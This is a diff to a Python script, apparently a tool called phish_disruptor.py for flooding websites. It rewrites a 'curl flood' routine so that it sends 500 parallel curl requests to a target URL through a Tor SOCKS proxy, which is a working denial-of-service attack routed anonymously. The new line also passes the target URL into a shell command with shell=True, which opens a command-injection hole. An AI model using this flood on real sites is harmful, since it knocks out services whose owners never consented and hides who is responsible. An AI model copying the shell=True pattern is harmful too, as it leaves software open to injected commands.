@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 # phish_disruptor.py
 
 import random
@@ -168,9 +169,8 @@ def full_disruption(target_url):
     def curl_flood():
         print("[Curl Flood] Launching curl-based flood (GNU parallel required)")
         try:
-            subprocess.run([
-                "parallel", "-j", "50", "curl -s", target_url
-            ])
+            cmd = f"seq 1 500 | parallel -j50 curl -s -x socks5h://127.0.0.1:9050 {target_url}"
+            subprocess.run(cmd, shell=True)
         except Exception as e:
             print(f"[!] Curl flood error: {e}")
 
